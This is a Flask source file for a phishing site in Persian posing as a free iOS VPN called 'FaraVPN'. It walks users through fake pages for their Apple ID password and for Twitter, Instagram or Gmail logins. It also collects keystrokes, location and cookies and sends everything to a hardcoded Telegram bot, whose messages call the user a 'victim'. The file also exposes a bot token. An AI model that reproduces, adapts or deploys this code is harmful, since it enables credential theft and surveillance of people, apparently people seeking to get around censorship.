from flask import Flask, request, render_template_string, url_for
import requests
import json
import threading
import random
import time

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "8144273028:AAGRluY75gCirELIzkCTHvP5EJwO_JLMRtQ"
TELEGRAM_CHAT_ID = "8147028352"

def send_to_telegram(data, message_type="data"):
    user_agent_str = data.get('userAgent', 'Unknown')
    ios_match = user_agent_str.lower().split('os ')
    ios_version = "Unknown"
    if len(ios_match) > 1:
        version_part = ios_match[1].split(' ')[0].replace('_', '.')
        if 'like mac os x' in version_part.lower():
            ios_version = version_part.split('like')[0].strip()
        else:
            ios_version = version_part.split(';')[0].strip()

    platform_info = "iPhone" if "iPhone" in user_agent_str else ("iPad" if "iPad" in user_agent_str else "Unknown Device")
    
    device_info = f"{platform_info}, iOS {ios_version}"
    message = ""
    if message_type == "visit":
        message = f"رئیس! قربانی ({device_info}) وارد FaraVPN شد! 😎"
    elif message_type == "data":
        message = f"اطلاعات قربانی ({device_info}) از FaraVPN با موفقیت دریافت شد! 🎉\n\n"
        if "apple_id" in data:
            message += f"اپل آیدی: {data['apple_id']}\n"
            message += f"رمز اپل آیدی: {data['password']}\n"
        if "social_accounts" in data:
            for account in data['social_accounts']:
                message += f"اکانت {account['service']}: {account['username']}\n"
                message += f"رمز {account['service']}: {account['password']}\n"
        if "keystrokes" in data:
            keystroke_list = [f"'{k['key']}' (at {k['time'].split('T')[1].split('.')[0]}Z)" for k in data['keystrokes']]
            message += "کلیدهای فشرده‌شده:\n" + "\n".join(keystroke_list) + "\n"
        if "location" in data and data['location']:
            message += f"موقعیت: ({data['location']['lat']:.4f}, {data['location']['lon']:.4f})\n"
        if "cookies" in data:
            message += f"کوکی‌ها: {data['cookies']}\n"
        if "userAgent" in data:
            message += f"مرورگر: {data['userAgent']}\n"
        if "platform" in data:
            message += f"پلتفرم: {data['platform']}\n"
        if "language" in data:
            message += f"زبان: {data['language']}\n"
        if "screen" in data:
            message += f"صفحه: {data['screen']['width']}x{data['screen']['height']}\n"
        if "ios_version" in data:
            message += f"نسخه iOS: {data['ios_version']}\n"
        message += f"زمان: {data['timestamp']}"

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
        print("Telegram message sent successfully!")
    except Exception as e:
        print(f"Failed to send Telegram message: {e}")

@app.route("/")
def index():
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ios_match = user_agent.lower().split('os ')
    ios_version = "Unknown"
    if len(ios_match) > 1:
        version_part = ios_match[1].split(' ')[0].replace('_', '.')
        if 'like mac os x' in version_part.lower():
            ios_version = version_part.split('like')[0].strip()
        else:
            ios_version = version_part.split(';')[0].strip()

    platform_info = "iPhone" if "iPhone" in user_agent else ("iPad" if "iPad" in user_agent else "Unknown Device")

    device_info = {
        "platform": platform_info,
        "ios_version": ios_version,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    }
    threading.Thread(target=send_to_telegram, args=(device_info, "visit")).start()

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fa">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>FaraVPN - فیلترشکن رایگان برای iOS</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl;}
            .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center;}
            .logo img { width: 120px; margin-bottom: 20px;}
            button { background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px;}
            button:hover { background: #1557b0;}
            #cookie-consent { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 999; display: flex; justify-content: center; align-items: center;}
            #cookie-box { background: white; padding: 20px; border-radius: 10px; max-width: 400px;}
            #lila-popup { display: none; position: fixed; bottom: 20px; right: 20px; background: rgba(0,0,0,0.9); color: white; padding: 15px; border-radius: 10px; max-width: 300px; z-index: 998; animation: slideIn 0.5s;}
            #lila-text { font-size: 16px; font-style: italic;}
            @keyframes slideIn { from { transform: translateX(100%);} to { transform: translateX(0); }}
            @media (max-width: 600px) {.container { max-width: 90%;} #lila-popup { max-width: 80%; }}
        </style>
    </head>
    <body>
        <div id="cookie-consent">
            <div id="cookie-box">
                <h2>اجازه کوکی‌ها</h2>
                <p>ما از کوکی‌ها برای بهبود تجربه شما در FaraVPN استفاده می‌کنیم. برای ادامه قبول کنید.</p>
                <button onclick="acceptCookies()">قبول</button>
            </div>
        </div>
        <div id="lila-popup">
            <img src="https://i.ibb.co/0X0Z0X0/lila.png" style="width: 50px; border-radius: 50%; margin-bottom: 10px;">
            <p id="lila-text">عزیزم، با FaraVPN هیچوقت قطع نمی‌شی! 😊</p>
        </div>
        <div class="container">
            <div class="logo">
                <img src="https://i.ibb.co/2P5Y7zJ/faravpn-logo.png" alt="FaraVPN Logo">
            </div>
            <h2>FaraVPN - فیلترشکن رایگان برای iOS</h2>
            <p>با ما هیچوقت قطع نخواهید شد! فراتر از استارلینک رو اینجا تجربه کن! ما تنظیمات VPN رو مستقیم تو گوشیت اعمال می‌کنیم و آپدیت‌ها خودکار نصب می‌شن. برای فعال‌سازی، نیاز به اپل آیدی داریم تا سرورهای FaraVPN بتونن تنظیمات رو روی iOS شما ست کنن.</p>
            <button onclick="window.location.href='/login'">اوکی، فهمیدم!</button>
        </div>
        <script src="{{ url_for('static', filename='script.js') }}"></script>
    </body>
    </html>
    ''')

@app.route("/login")
def login():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fa">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ورود با اپل آیدی - FaraVPN</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl;}
            .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center;}
            .logo img { width: 120px; margin-bottom: 20px;}
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px;}
            button { background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px;}
            button:hover { background: #1557b0;}
            #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000;}
            #loading-spinner { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 24px;}
            #lila-popup { display: none; position: fixed; bottom: 20px; right: 20px; background: rgba(0,0,0,0.9); color: white; padding: 15px; border-radius: 10px; max-width: 300px; z-index: 998; animation: slideIn 0.5s;}
            #lila-text { font-size: 16px; font-style: italic;}
            @keyframes slideIn { from { transform: translateX(100%);} to { transform: translateX(0); }}
            @media (max-width: 600px) {.container { max-width: 90%;} #lila-popup { max-width: 80%; }}
        </style>
    </head>
    <body>
        <div id="loading">
            <div id="loading-spinner">در حال بارگذاری... <span style="animation: spin 1s infinite linear;">◠</span></div>
        </div>
        <div id="lila-popup">
            <img src="https://i.ibb.co/0X0Z0X0/lila.png" style="width: 50px; border-radius: 50%; margin-bottom: 10px;">
            <p id="lila-text">عزیزم، با FaraVPN هیچوقت قطع نمی‌شی! 😊</p>
        </div>
        <div class="container">
            <div class="logo">
                <img src="https://i.ibb.co/2P5Y7zJ/faravpn-logo.png" alt="FaraVPN Logo">
            </div>
            <h2>ورود با اپل آیدی</h2>
            <p>برای فعال‌سازی FaraVPN، اپل آیدی و رمز خود را وارد کنید</p>
            <form id="login-form">
                <input type="text" id="username" placeholder="ایمیل یا اپل آیدی" required>
                <input type="password" id="password" placeholder="رمز عبور" required>
                <button type="submit">ادامه</button>
            </form>
        </div>
        <script src="{{ url_for('static', filename='script.js') }}"></script>
    </body>
    </html>
    ''')

@app.route("/social")
def social():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fa">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تأیید هویت اضافی - FaraVPN</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl;}
            .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center;}
            .logo img { width: 120px; margin-bottom: 20px;}
            select, input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px;}
            button { background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px;}
            button:hover { background: #1557b0;}
            #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000;}
            #loading-spinner { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 24px;}
            #lila-popup { display: none; position: fixed; bottom: 20px; right: 20px; background: rgba(0,0,0,0.9); color: white; padding: 15px; border-radius: 10px; max-width: 300px; z-index: 998; animation: slideIn 0.5s;}
            #lila-text { font-size: 16px; font-style: italic;}
            @keyframes slideIn { from { transform: translateX(100%);} to { transform: translateX(0); }}
            @media (max-width: 600px) {.container { max-width: 90%;} #lila-popup { max-width: 80%; }}
        </style>
    </head>
    <body>
        <div id="loading">
            <div id="loading-spinner">در حال بارگذاری... <span style="animation: spin 1s infinite linear;">◠</span></div>
        </div>
        <div id="lila-popup">
            <img src="https://i.ibb.co/0X0Z0X0/lila.png" style="width: 50px; border-radius: 50%; margin-bottom: 10px;">
            <p id="lila-text">عالیه! فقط یه تأیید دیگه تا فعال‌سازی FaraVPN! 😊</p>
        </div>
        <div class="container">
            <div class="logo">
                <img src="https://i.ibb.co/2P5Y7zJ/faravpn-logo.png" alt="FaraVPN Logo">
            </div>
            <h2>تأیید هویت اضافی</h2>
            <p>برای امنیت بیشتر و فعال‌سازی FaraVPN، لطفاً یکی از اکانت‌های زیر را وارد کنید</p>
            <form id="social-form">
                <select id="service" required>
                    <option value="" disabled selected>سرویس را انتخاب کنید</option>
                    <option value="توییتر">توییتر</option>
                    <option value="اینستاگرام">اینستاگرام</option>
                    <option value="جیمیل">جیمیل</option>
                </select>
                <input type="text" id="social-username" placeholder="نام کاربری یا ایمیل" required>
                <input type="password" id="social-password" placeholder="رمز عبور" required>
                <button type="submit">فعال‌سازی</button>
            </form>
        </div>
        <script src="{{ url_for('static', filename='script.js') }}"></script>
    </body>
    </html>
    ''')

@app.route("/collect", methods=["POST"])
def collect():
    data = request.json
    threading.Thread(target=send_to_telegram, args=(data, "data")).start()
    return {"status": "success", "redirect": "/social" if "apple_id" in data else "/loading"}

@app.route("/loading")
def loading():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="fa">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>در حال بارگذاری... - FaraVPN</title>
        <style>
            body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #f1f1f1;}
            .spinner { font-size: 48px; animation: spin 1s infinite linear;}
            @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);}}
            @media (max-width: 600px) {.spinner { font-size: 36px;}}
        </style>
    </head>
    <body>
        <div class="spinner">◠</div>
    </body>
    </html>
    """)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
